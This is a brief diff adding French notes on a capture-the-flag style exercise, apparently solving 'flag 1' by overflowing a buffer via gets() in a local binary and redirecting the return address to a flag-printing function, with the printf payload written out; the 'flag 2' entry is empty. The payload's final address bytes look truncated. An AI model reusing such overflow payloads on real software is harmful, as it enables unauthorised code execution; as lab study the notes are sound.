@@ -1,0 +1,6 @@
+flag 1 : 
+on veut overwrite sur le buffer et utiliser la vulenarabilité sur gets pour appeler chemin sur l'adresse de retour.
+donc pour username 24 A, pour 32 X pour la response et 8 X pour le pointer de username et apres on met l'adresse de chemin qui montre le flag 1.
+payload : printf "XXXXXXXXXXXXXXXXXXXXXXXXAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x92\x04\x8" | ./carte
+
+flag 2: 
